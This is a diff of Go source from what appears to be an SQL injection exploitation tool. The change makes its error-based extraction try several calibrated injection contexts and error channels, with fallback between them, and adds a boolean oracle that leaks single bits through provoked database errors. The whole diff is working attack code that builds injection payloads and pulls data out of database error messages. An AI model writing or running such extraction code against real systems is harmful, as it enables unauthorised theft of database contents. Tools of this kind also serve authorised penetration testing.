@@ -17,6 +17,14 @@ const errorProbeValue = "VEXORTEST"
 // against runaway chunk loops on degenerate targets.
 const maxErrorChunks = 32
 
+// errTriple is one fully-calibrated way to provoke a DBMS error that echoes a
+// value: the injection context (prefix/suffix) plus the leak channel.
+type errTriple struct {
+	prefix string
+	suffix string
+	ch     *dbms.ErrorFn
+}
+
 // errorWrappers are the injection-context templates tried when the confirmed
 // payload cannot be reused directly. {orig} is replaced with the original
 // parameter value.
@@ -30,14 +38,40 @@ var errorWrappers = []struct{ prefix, suffix string }{
 }
 
 // errorString reads an arbitrary SQL scalar expression through the error
-// channel, positionally, in Chunk-sized pieces.
+// channel, positionally, in Chunk-sized pieces. It tries every calibrated leak
+// triple in order until one can fully read the value.
 func (x *Extractor) errorString(ctx context.Context, expr string) (string, error) {
 	if err := x.calibrateError(ctx); err != nil {
 		return "", err
 	}
-	prefix, suffix, chunk, ok := x.errorFields()
-	if !ok {
+	triples := x.triples()
+	if len(triples) == 0 {
 		return "", errors.New("error-based extraction channel unavailable")
+	}
+	var lastErr error
+	for _, t := range triples {
+		if ctx.Err() != nil {
+			return "", ctx.Err()
+		}
+		val, err := x.errorStringVia(ctx, t, expr)
+		if err != nil {
+			lastErr = err
+			continue
+		}
+		return val, nil
+	}
+	if lastErr != nil {
+		return "", lastErr
+	}
+	return "", errors.New("error-based extraction channel unavailable")
+}
+
+// errorStringVia reads one scalar expression fully through a single calibrated
+// triple, in positional Chunk-sized reads.
+func (x *Extractor) errorStringVia(ctx context.Context, t errTriple, expr string) (string, error) {
+	chunk := t.ch.Chunk
+	if chunk <= 0 {
+		chunk = 30
 	}
 	var sb strings.Builder
 	pos := 1
@@ -46,7 +80,7 @@ func (x *Extractor) errorString(ctx context.Context, expr string) (string, error
 			return "", ctx.Err()
 		}
 		valueExpr := "ifnull(substring((" + expr + ")," + itoa(int64(pos)) + "," + itoa(int64(chunk)) + "),'')"
-		part, err := x.errorReadOnce(ctx, prefix, suffix, chunk, valueExpr)
+		part, err := x.errorReadOnce(ctx, t.prefix, t.suffix, t.ch, chunk, valueExpr)
 		if err != nil {
 			return "", err
 		}
@@ -62,10 +96,52 @@ func (x *Extractor) errorString(ctx context.Context, expr string) (string, error
 	return sb.String(), nil
 }
 
-// errorReadOnce injects one expression and parses the leaked value from the
-// provoked DBMS error.
-func (x *Extractor) errorReadOnce(ctx context.Context, prefix, suffix string, chunk int, valueExpr string) (string, error) {
-	payload := prefix + x.errChannel().Build(valueExpr) + suffix
+// evalError evaluates a boolean condition by leaking "1" / "0" through the
+// error channel: CASE WHEN ((cond)) THEN 1 ELSE 0 END is mishandled so the
+// DBMS echoes the resolved bit. This gives error-based targets a decisive
+// oracle that survives even when the value itself is too large for one error
+// message, so blind extraction can drive reading via single conditions.
+func (x *Extractor) evalError(ctx context.Context, cond string) (bool, bool, error) {
+	if err := x.calibrateError(ctx); err != nil {
+		return false, false, err
+	}
+	triples := x.triples()
+	if len(triples) == 0 {
+		return false, false, errors.New("error-based extraction channel unavailable")
+	}
+	expr := "case when ((" + cond + ")) then 1 else 0 end"
+	var lastErr error
+	for _, t := range triples {
+		if ctx.Err() != nil {
+			return false, false, ctx.Err()
+		}
+		payload := t.prefix + t.ch.Build(expr) + t.suffix
+		resp, err := x.send(ctx, payload)
+		if err != nil {
+			lastErr = err
+			continue
+		}
+		val, ok := parseErrorValue(resp.Body, t.ch.Chunk)
+		if !ok {
+			continue
+		}
+		switch val {
+		case "1":
+			return true, true, nil
+		case "0":
+			return false, true, nil
+		}
+	}
+	if lastErr != nil {
+		return false, false, lastErr
+	}
+	return false, false, errors.New("error channel did not echo a decisive boolean")
+}
+
+// errorReadOnce injects one expression through the given channel triple and
+// parses the leaked value from the provoked DBMS error.
+func (x *Extractor) errorReadOnce(ctx context.Context, prefix, suffix string, ch *dbms.ErrorFn, chunk int, valueExpr string) (string, error) {
+	payload := prefix + ch.Build(valueExpr) + suffix
 	resp, err := x.send(ctx, payload)
 	if err != nil {
 		return "", err
@@ -85,6 +161,14 @@ func (x *Extractor) errChannel() *dbms.ErrorFn {
 	return x.errChan
 }
 
+// triples returns the calibrated leak triples (all working injection contexts
+// and channels). Callers must have already run calibrateError.
+func (x *Extractor) triples() []errTriple {
+	x.errMut.Lock()
+	defer x.errMut.Unlock()
+	return x.errTriples
+}
+
 // errorFields snapshots the calibrated channel state under the lock.
 func (x *Extractor) errorFields() (prefix, suffix string, chunk int, ok bool) {
 	x.errMut.Lock()
@@ -98,10 +182,13 @@ func (x *Extractor) errorFields() (prefix, suffix string, chunk int, ok bool) {
 	return prefix, suffix, ch.Chunk, true
 }
 
-// calibrateError finds a working (prefix, suffix, channel) triple by first
-// re-using the exact injection context of the confirmed error payload, then
-// falling back to the generic wrapper families. The result is cached; a total
-// failure permanently disables the error path so the blind engine takes over.
+// calibrateError finds every (prefix, suffix, channel) triple that echoes a
+// value back. It first re-uses the exact injection context of the confirmed
+// error payload, then falls back to the generic wrapper families. The first
+// working triple also becomes the canonical channel (backward compatible), and
+// the full set is retained so extraction can fall over to a secondary channel
+// when the primary stops reflecting. A total failure permanently disables the
+// error path so the blind engine takes over.
 func (x *Extractor) calibrateError(ctx context.Context) error {
 	x.errMut.Lock()
 	defer x.errMut.Unlock()
@@ -109,14 +196,14 @@ func (x *Extractor) calibrateError(ctx context.Context) error {
 		return nil
 	}
 
+	var working []errTriple
+
 	// 1) Reuse the injection context present in the confirmed payload.
 	if prefix, suffix, ok := deriveErrorPrefix(x.detPayload); ok {
 		for i := range x.errChans {
 			ch := &x.errChans[i]
-			if probe := x.errorProbe(ctx, prefix, suffix, ch, ch.Build("'"+errorProbeValue+"'")); probe == errorProbeValue {
-				x.errPrefix, x.errSuffix, x.errChan, x.errKnown = prefix, suffix, ch, true
-				x.logChannel(ch.Name)
-				return nil
+			if x.errorProbe(ctx, prefix, suffix, ch, ch.Build("'"+errorProbeValue+"'")) == errorProbeValue {
+				working = append(working, errTriple{prefix: prefix, suffix: suffix, ch: ch})
 			}
 		}
 	}
@@ -126,19 +213,42 @@ func (x *Extractor) calibrateError(ctx context.Context) error {
 		prefix := strings.ReplaceAll(w.prefix, "{orig}", x.Original())
 		for i := range x.errChans {
 			ch := &x.errChans[i]
-			if probe := x.errorProbe(ctx, prefix, w.suffix, ch, ch.Build("'"+errorProbeValue+"'")); probe == errorProbeValue {
-				x.errPrefix, x.errSuffix, x.errChan, x.errKnown = prefix, w.suffix, ch, true
-				x.logChannel(ch.Name)
-				return nil
+			if x.errorProbe(ctx, prefix, w.suffix, ch, ch.Build("'"+errorProbeValue+"'")) == errorProbeValue {
+				working = append(working, errTriple{prefix: prefix, suffix: w.suffix, ch: ch})
 			}
 		}
 	}
 
-	x.errBroken = true
-	return fmt.Errorf(
-		"error-based extraction unavailable: no payload echoed a value back (raw DBMS error observed: %q); falling back to blind extraction",
-		x.LastErrorSnippet(),
-	)
+	if len(working) == 0 {
+		x.errBroken = true
+		return fmt.Errorf(
+			"error-based extraction unavailable: no payload echoed a value back (raw DBMS error observed: %q); falling back to blind extraction",
+			x.LastErrorSnippet(),
+		)
+	}
+
+	// First working triple keeps the canonical fields for callers that only
+	// read the primary channel.
+	first := working[0]
+	x.errPrefix, x.errSuffix, x.errChan, x.errKnown = first.prefix, first.suffix, first.ch, true
+	x.errTriples = dedupTriples(working)
+	x.logChannel(first.ch.Name)
+	return nil
+}
+
+// dedupTriples collapses working triples that resolve to the same injection
+// context and channel.
+func dedupTriples(in []errTriple) []errTriple {
+	var out []errTriple
+	seen := make(map[string]bool)
+	for _, t := range in {
+		key := t.prefix + "\x00" + t.suffix + "\x00" + t.ch.Name
+		if !seen[key] {
+			seen[key] = true
+			out = append(out, t)
+		}
+	}
+	return out
 }
 
 // errorProbe injects a probe expression and returns the leaked value, or ""
